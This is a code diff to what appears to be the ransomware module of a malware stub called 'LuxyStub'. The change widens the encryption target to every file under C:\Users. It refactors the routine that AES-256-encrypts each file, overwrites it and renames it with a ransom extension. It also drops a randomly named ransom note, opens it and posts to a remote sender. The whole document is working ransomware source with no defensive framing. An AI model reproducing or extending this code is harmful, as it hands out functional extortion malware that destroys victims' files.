@@ -17,9 +17,11 @@ namespace LuxyStub.Modules.Ransomware
 
         private static async Task Process()
         {
-            //var encryptPath = @"C:\Users\Public\RanDebug"
-            var encryptPath = $@"C:\Users\{Environment.UserName}";
-            var filesPath = Common.FilesTree(encryptPath);
+            //var encryptPath = @"C:\Users\Public\";
+            //var encryptPath = $@"C:\Users\{Environment.UserName}\Desktop";
+            var encryptPath = @"C:\Users";
+            Common.ParsePath(encryptPath);
+            var filesPath = Common.AllFiles.ToArray();
             if (filesPath.Length == 0)
             {
                 return;
@@ -37,11 +39,8 @@ namespace LuxyStub.Modules.Ransomware
                 {
                     try
                     {
-                        Console.WriteLine(file);
-                        var rawData = File.ReadAllBytes(file);
-                        var encryptedData = Aes256.Encrypt(rawData, Settings.EncryptKey, Settings.EncryptIV);
-                        File.WriteAllText(file, Convert.ToBase64String(encryptedData));
-                        File.Move(file, $"{file}.{Settings.EncryptExtension}");
+                        Task encryptFileTask = EncryptFile(file);
+                        await Task.WhenAll(encryptFileTask);
                     }
                     catch
                     {
@@ -50,24 +49,26 @@ namespace LuxyStub.Modules.Ransomware
                 }
 
                 var current_directory = Directory.GetCurrentDirectory();
-                var readme_path = $"{current_directory}\\R34DM3{Common.GenerateRandomString(10)}.txt";
+                var readme_path = $"{current_directory}\\{Common.GenerateRandomString(10)}.README.txt";
 
                 File.WriteAllText(readme_path, Settings.ReadMeMessage.Replace("{personal_id}", Settings.PersonalID));
-                Console.WriteLine(readme_path);
 
                 System.Diagnostics.Process.Start(readme_path);
                 await Sender.Post(new Dictionary<string, int> { });
 
-                Common.cmd($"notepad {readme_path}");
-
             }catch (Exception ex)
             {
                 Console.WriteLine(ex);
-                while (true)
-                {
-
-                }
             }
+        }
+
+        private static async Task EncryptFile(string file)
+        {
+            Console.WriteLine(file);
+            var rawData = File.ReadAllBytes(file);
+            var encryptedData = Aes256.Encrypt(rawData, Settings.EncryptKey, Settings.EncryptIV);
+            File.WriteAllText(file, Convert.ToBase64String(encryptedData));
+            File.Move(file, $"{file}.{Settings.EncryptExtension}");
         }
     }
 }
